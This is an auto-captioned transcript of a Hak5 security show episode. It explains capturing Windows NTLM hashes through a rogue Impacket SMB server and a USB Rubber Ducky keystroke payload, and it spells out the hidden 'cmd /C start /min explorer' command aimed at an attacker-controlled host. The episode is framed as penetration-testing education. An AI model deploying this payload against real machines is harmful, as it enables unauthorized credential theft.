ducky payload to steal plain text
Windows passwords in 15 seconds so what
if I told you we can get just the log on
hash in under two that's right a two
second technique for stealing Windows
password hashes and otherwise auditing
corporate USB drive policies all that
and more this time on hack five hello
welcome to hack five my name is Gerren
kitchen I'm Shannon Morse
it's your weekly dose of techno last I
was totally thinking about like setting
you off knew you were about to steal it
proud to be her coach uh what an amazing
fun time has been recently we had a
great time last week with that mr. robot
password hash or password stealing mimic
cats payload of doom yeah last week we
showed off the technique using invoke
mimikatz
and powershell powershell to steal
plaintext windows passwords in 15
seconds it's a great payload but it does
require a little bit of time with the
victim PC so to take it a step further
well going to be looking at a technique
to steal just the password hash in under
two seconds leaving extremely little
time to defend against the attack yes I
love this idea this is gonna be fun
super super iets so a little bit of
theory behind this one yeah can we suck
it give me stickers can we do so do we
have stickers yes tears all right we're
gonna do that we're getting into the
theory and then we're gonna build on the
hack boy assume we have sicker we have
stickers we have a ton of stickers but
most of these are duplicates these are
actually from our friend who gave all of
them to us at Def Con Wow this is a lot
of stickers so I'm one of the guys I
wrote this book his name is beau Weaver
and this is called Kali Linux to Windows
penetration testing he dropped by our
booth and he said his big fan of the
show and he gave us copies of his books
and they even signed him on the bottom
and he gave us all these awesome
stickers to put on her wall so I wanted
to give him a little bit of pimpish
there and toss on a few of his stickers
on our our sticker wall back here
because I thought it was really cool and
I'm a huge bookworm so I'm really
excited to get my learn on with some
more penetration testing I'm very very
excited about that what do we have to
what I don't even know I like this one
that says hacked
oh that's brilliant I just want to put
that on everything I two-tier I'm gonna
put things the red it's in like Archer
script - that's great
all right there I got there yeah okay
hat yes no not really
right I'm actually like just Foley of
anybody I got a dart at the convention
yeah do you know I brought a Faraday
cage with me that was doing
it's a Def Con Wow there's okay so we'll
get into the rest of these stickers yeah
because that's that's awesome thanks for
sending those bike yes Thank You Boake
exciting so cool
right alright so moving on to well okay
sure so password hashes right we've
talked about these in the past we've
done though a couple of episodes on
password cracking hazard hash cracking
and we talked to the about that a little
bit last week when we're talking about
mimic cats and how it not only gets this
LM and ntlm hashes that we're familiar
with but also the plaintext passwords so
that takes a little bit of doing and if
you just want something a little bit
more cover something that happens like
real quick without the ability for the
user to get interactive and stop it
because you know it does take like 15
seconds so with that command window up
you know you can obfuscate it you can
minimize it but still like a viewer was
like oh no what's happening and like you
know closed it then you know it could be
a bad day of course but we can get the
hash in just like a matter like a blink
of an eye and then it's like wait a
second which would happened right so I'm
going to show how that works but we do
we need to understand a little bit about
Windows shares which we use here at the
at the studio yes we do SMB or server
message block sometimes called CIFS or
common Internet file system it's
predominantly a Windows thing we're
talking about Microsoft Windows networks
here we're talking about the file
sharing that we know and love on yeah
you see port 445 which is typically
blocked on the internet but you'll see
why if you are doing a pen test this is
the quickest way to get hash so let's go
ahead and and talk about well let me
show you an example because you've
probably already seen this so on the
right I have my you know boring windows
box and on the Left I've got mccally
linux box and i'm just going to go ahead
and pull up the run line or I could do
this straight from Explorer but if you
just type in backslash backslash
an IP address yeah so in this case ten
dot 73 231 74 we have an ass here at the
so in this case it brings up our Nass
exactly you'll notice the first thing it
wants to do is login and here's the
thing you know if it's a domain a lot of
times it's going to go ahead and just
like send the credentials that has on
file if obviously this isn't accepting
the credentials it has on file for this
particular user this user is Who am I is
DK on this workstation right so the
workstations name wind Ashleigh all that
stuff and the user name is DK and as we
saw last week the password is lame
password so your NASA isn't recognizing
this this workstation no because well if
the if the NASS for instance had a user
called DK with the password lame
password it would have authenticated oh
our Nass doesn't so I have to go back
here and I'll be like Darin and I'll
just you know login and you'll see there
we go here's you know our here's our now
all of our show right here's all our
show then go into hack tip and check out
episodes of hack tip anyway that's how
we organize our stuff here at act 5
but part of that process is to
authenticate so we're going to use that
to our advantage and we're going to do
it with samba oh yeah remember last week
we were talking about going to VN n how
we're gonna do the waltz I figured that
you would like to Samba
I'm leaving right now okay so Samba is a
free software implementation of SMB for
unix linux solaris bsd etc and core
security I love those guys they host
this thing called impact you can you can
come back okay I'm not gonna try to
dance with you we might tango later um
trying to tell them I don't like dancing
man all right dance with your imaginary
friend oh there you go uh does that mean
that anyway later so impact in packet
yeah I am packing we're off the rails a
little big so of course security awesome
guys they host this thing under github
called in packet is a collection of
Python scripts for working with network
protocols and it's a fantastic resource
if you want to start getting into
playing around with all sorts of
fun nefarious stuff so I'll go in to
impac it here and you'll see that
there's all of these examples one of
which I'll go down here SMB there's a
karma SMB that's a fun one for another
time we've got SMB clients we've got SMB
servers this is really great for like
you know doing some research so one of
the fun things that we're going to be
able to do is run our own SMB server
kind of like a fake well it's a real SMB
server but we're going to do it in Linux
and we're going to be able to capture
credentials with it because part of that
whole initiation of opening at SMB share
is to you know send over our
authentication hash right so vulnerable
yes awesome so let's go ahead and do
exactly that I actually have if I switch
over to in packet LS and you'll see here
we have all of these different examples
and I'm just going to go ahead and run
dot slash SMB server okay so here's how
you run SMB server and in fact I'll just
make this a little bit smaller so we can
read that so what we'll need to do is we
need to pass it basically a share name
and a share path we can add comments we
really want or any of that stuff so for
the share name I'll call it TMP and for
the path I'll point it to slash temp
because I really don't care about what's
actually there if I if I cared I might
make a directory in fact this isn't
where we might make a directory hosting
some malware you should point that out
but when I go ahead and run this you'll
see I now have an SMB server running
okay cool so if I now go to my Windows
machine pull up that run line and type
in backslash backslash the IP address of
this server let's see what the IP
address is if config at the zero it is
10 73 31 136 right can I leave this open
and notice this SMB server running right
here 10 dot 73 231 to 136
Oh boom well there it is there's TMP and
I can go in there and if there's the
actual you know storage from that
computer which is great if you want to
quickly transfer some files to a Windows
box but you notice something we got this
authentication message incoming message
from and this is the IP address
of this Windows box and we got the user
DK at that workstation and then it
authenticated and then here's our hash
so check that out so we should mention
that we have done episodes on hashes
previously there's a couple that we did
it was season 9 episode 12 and then
season 12 episode 18 and we'll put those
in cards over here on YouTube in case
you're watching on YouTube should
probably do a follow-up on them we
really should not be in a while has been
right and then I've been doing this for
11 years but and there's a lot of cool
different techniques and things that you
can do with hashes that you might not be
aware of so I'm excited about this
because this is the perfect example of a
payload what we're now going to turn
this into a USB rubber ducky payload
that will happen in the blink of an eye
and help you on your next engagement
audit USB policies because you know
we've all seen that we all seen that
story of like Oh a litter the parking
lot with USB drives and see who plugs
one in all right well this is brilliant
because we literally know who plugs one
in in this instance because it sends the
user and the workstation and the
timestamp and bonus would get the hash
so this is a really fantastic and quick
and easy payload that you can use to
find out who is plugging in to what
workstations when USB drives that they
shouldn't be plugging in at the
corporate environment should mention
though this does require running a Samba
server on that corporate network ok Gedo
now the reason for that is most Internet
service providers are going to block
port 4 4 5 4 or 4 5 5 4 4 5 anyway
they're going to block SMB ok so you're
not going to be able to like say host
this up in the cloud so again this is
for a lawful audit this is for like hey
you've been you know contracted yeah to
audit this organization and this is one
of my favorite payloads because it was
requested of us last year by a major
bank that littered these around all of
their branch offices and was able to
tell who's being naughty oh wow that's
so bad so let's turn this into a USB
rubber ducky script
and payload mayhem right after the break
when you've got that great idea like
owning a computer in 15 seconds or less
you know that you need to bring it to
the interweb and share it with the world
so please do what Shannon and I do and
that's head over to domain.com these
guys have an awesome domain discovery
system that'll help you choose the right
domain and their easy checkout process
will have your website up and online in
no time flat and get this the guys over
at domain.com huge fans of hack 5 and
you guys so we have a special coupon
code just for you it's hak5 that spells
hack 5 and it'll also save you 20% at
checkout so check that out isn't that
awesome guys at domain.com are huge fans
and we want to show them support so even
if you don't need a domain this exact
moment you should tweet them at
domain.com and say hey thanks for
supporting hack 5 all these years and
when you think domain names think
domain.com we're now back and it's time
to turn this into a ducky payload wahoo
alright very similar to how we did last
week in fact I think this is a fantastic
alert pop-up pop-up that's a fantastic
example of how we can go ahead and
iterate on developing USB rubber ducky
payloads and so if we take a look at my
computer you'll see that I have kind of
you know the whole instant setup I've
got my you know the impacted SMB server
Python script running on my cally box on
the left and then I love using VMs for
this because I can pull this up and test
it and as we saw there we go it works
it's important to go ahead and do that
because now I can retrace those steps so
in a new window I'm going to go ahead
and open Nano and we're going to call
this SMB hash grab dot text sure okay
and so I'm going to start developing my
ducky script first thing of course is
give it a comment I don't know
cool yeah and then we'll say and then
we'll do that initial delay of one
second so after that what did we do on
the Windows host well we held down
Windows key and hit R that's how a lot
of payloads begin to get that run line
yeah so it's going to be gooey and the R
key then after that we're going to need
to start typing in something so let's
see GU er well we should probably delay
just in case it takes a second for that
to show up but really not long like a
tenth of a second is fine so delay for a
hundred milliseconds then well we know
that it worked if we just typed in
backslash backslash that IP address so
string backslash backslash 10 73 31 1 3
6 ok then after that what do we need to
do well we need to hit enter so hit
enter it pops up good to go ok cool so
let's see Enter
well then let's see so let's do that
again so I keep iterating I keep doing
this on the left and then I'm like
testing it on the way ok so once I hit
enter this pops up should probably delay
for a turn I don't like 500 half a
second for that to make that network
connection and now I've got this open
and I'm like ok well it's time to close
it a couple of ways to close a window in
Windows if you've ever been on an IRC
you know the quickest way to get ops is
hold down alt and hit f4 and that's what
we're going to do today oh another way
to do it is to hold down alt in space
and you'll get this right here and you
could you can you can see it's all f4 or
you could you see how C is underlined we
have hit C so do that again alt space
just like we could also hit n for
minimize or X for Mac maximized or M for
move so you know however you want to do
that my preference is just literally all
f4 which Boop which Boop there we go ok
so in that case it'll just be alt f4 and
we're good to go that that's the entire
so save that out that is our 10 line
ducky script two of which are just
comments so I'm going to go ahead and
mount that SD card from the USB rubber
ducky into that virtual machine and I'm
going to go ahead and encode it so we
see that it just popped up I'm going to
do Java TAC jar duck encode AR our input
file is that SMB
- and then tack Oh for output is going
to be /media /root and then I'm just
going to overwrite that file so I'm just
doing that all in one command and now I
just need to safely eject this so I'm
just going to kind of recycle this back
all that out and say eject great so now
that's ejected I can go ahead and unplug
this switch over to my Windows box now
pull up this and close that out clear it
and restart okay so I got my SMB server
going now I'm just going to go ahead you
have to click back into the yes so when
I'm testing I'm using virtual machines
here because it makes it really easy for
me to go back and forth between Callie
and whatnot without having to have
physical machines so if I were to say
click into the Callie box and then plug
the USB rubber ducky into my laptop it's
going to open up in the cally box not
the bad way so I'll just go ahead and
click over to my Windows box and plug it
in so as soon as we plug it in there we
go and it closed so that was that was
pretty quick wow that was really great I
think we can make it slightly better and
this is the fun thing about building
duct scripts is you're like every time
you make you can make it faster make it
over 9000 exactly so let's do just that
okay okay so same process lather rinse
repeat grab our SD card out of the duct
pop it in the reader switch over to a
Callie side plug in that reader so we
can go ahead and replace that and let me
work on that duct script a little bit
let me use nano to open up SMB hash grab
and instead of this string I'm going to
rid of everything after that instead of
the string of just pulling up that
backslash backslash seven you know that
that SMB server we're going to actually
use CMD and I'm doing this on the
windows side live so you can see what's
going to happen CMD has a couple of
different options I'll give you an
example
/k if I did /k dir what that's going to
do is it's going to open the command
prompt and run dir and then close and
then stay open I could also do tree I
wonder if I can tree C colon backslash
so it's a little
longer tree C colon backslash yeah okay
so tree C colon backslash is an awesome
command that you should do and full
screen at the office so it makes it look
like you're krad ultra elite hacks or
right you'll notice that when it
finishes it leaves the command prompt
open let's run that same command again
but this time instead of /k let's do
slash capital C and it runs tree just
like before and then closes when it's
done oh right that's what the so c is
for closed c is for closed case for keep
i guess okay but what this means is we
can now pass it something and have it
like pop-up and then disappear
immediately the reason for this is we're
going to use the start command
okay so fun thing about start is it's
been in windows since windows 95 yeah
i'll show an example of this command i'm
going to open up CMD and i'm just going
to say start dot now as we know from
unix and linux everything else dot is
the current working directory yeah so
they hit start dot it just opens up the
current directory and explore
interesting right start has all of these
different you know things that you can
do right so you can specify all of the
stuff notice this 1 / min so we can do
mais exactly so I'll get through all
that and we'll do clear sorry it's not
clear it's CLS on DOS will do start
space slash min dot well nothing
happened right
yeah no something did notice that the
Explorer oh is now open and there it is
let me close that and do that once more
so you can see Explorer isn't open but
when I run that now Explorer is but so
don't minimize seen it and it doesn't
like pop up and then minimize it opens
it man yeah let's see where this is
going yeah I do all right so we'll put
it all together right so if I come back
over here what I'm going to want to do
now is couple both that start command
and Explorer and our Samba share and
that CMD
/c so it'll be CMD slash capital C what
are we going to do well we're going to
run the command start with / min and
then what are we're going to open
Explorer
or explorer.exe I'm not going to do the
dot exe because we don't need to and
it'll save a few characters and then
we're going to pass it where we want it
to go so in this case 10 dots 7330 1.1 3
6 and my quotation marks let me switch
back over to here so you can see a
lentil kate when we open and let me
close explorer so you'll see that
explorers and open and want to hit OK
mmm nothing popped up on the screen but
we still got our information yeah which
is really cool well it is if we click on
this right so it's it's one of those
things where we put this together and
well let's just do it and you'll see
like how quick and then we'll talk about
ways to improve upon that which may be
an exercise for the viewer alright okay
so let's come back over to that duck
script and replace that string with CMD
slash capital C quote start and then
what do we want to do we want to start
at minimized so / min Explorer and then
we're sending this as a parameter to
explore that that backslash backslash in
our server and of course that'll be the
server that you specify when you set it
up on your target and end quotes right
and our quotes okay and then after that
we just have enter and that's it so now
we'll save that file out so that's just
just like we did before
we'll just recycle that command that
just replaced the inject up in on the SD
card okay and now let's eject to the
foot the reader again and now I'm just
going to unplug that switch over to my
Windows box make that the active window
great pop my SD card in the duck and
when I plug the duck into the computer
now that was it ha ha ha ha ha I wasn't
really hahaha like I think it might
actually be less than two seconds and if
we switch back over to impact it you'll
see there we go we have credentials
again I'm larious another fun thing
about the data is if you press the
button on it replays the payload yeah so
I'll just go back over here and I'll
press the button and there we go like
that was really short
I love that that's so good we did leave
a Samba share open minimized yeah
chances are they're not going to notice
it eventually they may click it in which
case well instead of sharing /tmp share
something and then name it totally legit
don't ask questions right everything's
good ya-da-da-da upon this don't unplug
this don't unplug this fake me no one is
that's really cool whatever it is no
one's gonna unplug it yes so we'll have
this all written up in our show notes
which you can find below the episode if
you're watching this in the browser and
of course if you're on our youtube
channel you can find all of our previous
episodes and the show notes as well as
cards over on that side I believe yes I
feel really good about this one but you
know what I'm looking forward to what
somebody to comment below and be like
dude I got it down like I got a second
yeah so that's always the fun part about
it somebody will come up with that yes
absolutely funny oh man okay well I
think it's time for our next technology
of the week what do you think absolutely
let's do it you ready for it
all right so every week we are asking
what tickles your Technol us you can
tweet us Instagram us or Facebook us
with a hashtag hashtag hack five hak5
for your chance to win some awesome gear
from the hack shop you don't have to at
reply us or anything just hit hashtag
hack 5 and we'll be able to find them so
today we are giving out a Wi-Fi
pineapple Nano ooh as well as the Wi-Fi
pineapple a pork right so it's Darren
wrote and Shannon edited and it's so
awesome because you can just get this
and walk away with all the confidence on
all of the ways to you know do great
stuff with the Wi-Fi pineapples so very
very thick go very well together in fact
I think I get to choose this week all
right so what did you so mine actually
sent us three pictures oh okay
and he just sent them so let's see amor
all right so the first one is from IR
Jodi Taylor and he said at hack 5 Darren
out of the pro kit I bought from snubs
at DEFCON 20 so this is our old holder
pineapple oh that's the Wi-Fi pineapple
mark for but what is that on so this is
actually on I'll show you the next
picture you probably recognize him
yes I'm a huge star very slowly right
and I actually hey you know what I
actually thought Voyager was pretty good
so you know no flame I'm currently going
through the next generation again but
I'll get there so yeah this is Garrett
weighing the guy who starred in Star
Trek and it's ensign Harry Kim
unknowingly scanning everyone well he's
so he's so it's a tricorder the
tricorder
yes hostak so he modded it and put it
inside of a tricorder canon for life
signs with the pine out he's not done
yet oh no no he's not so the next
picture he said he said what I'll be
working on next assuming the next
pineapple can be squeezed into a medical
tricorder right oh and that kids love
that scanning for life forms yes so
great so yeah that is my pick for this
week so Jody we're gonna send you a
Wi-Fi pineapple nano so you can stick
that inside the medical tricorder and
take it to your next I don't know where
ever you meet Star Trek celebrities
there you go yes and that door fly make
sure you do mr. tricorder that's classic
engage yes with all of that said if you
would like to also get some awesome cool
fun swaggity swag fun gear that we make
here at hack 5 like the USB rubber ducky
that we just demonstrated or the Wi-Fi
pineapple which Jodi just won or of
course our land turtle you can find
those over at hae shop com we value your
support making this show happen and
allowing us to live that dream so check
out the cool pen test gear over at hack
shop calm and if you're interested in
hanging out with us at our the next
convention that we're going to hang out
at or the next meetup that we're
deciding to have you can hit us up over
at hak5 org that's where we put all of
our calendar things that are happening
in the next couple of months so I
believe we have a few different links
below as far as going to Derby con so
that'll be happy ending pretty soon and
I believe you're going somewhere as well
yeah we're going to be doing torque on
and then there's deep second Vienna in
November and who knows so many great
opportunities you can find links to ours
all of our social networks and all of
that good stuff over at HSA 5 org as
well as all of our shows so the
Metasploit minutes and the threat wires
and the tech things and the hack 5 and
the hack tips so thank you so much then
feed back at hack 5 to org is where you
can email us
and yeah I think that's it I think that
is okay well with all of that said i'm
darren kitchen I'm Shannon Morse
dressed your techni list engaged we are
map Lily oh my gosh it sounded like I
was speaking backwards shut up Wesley
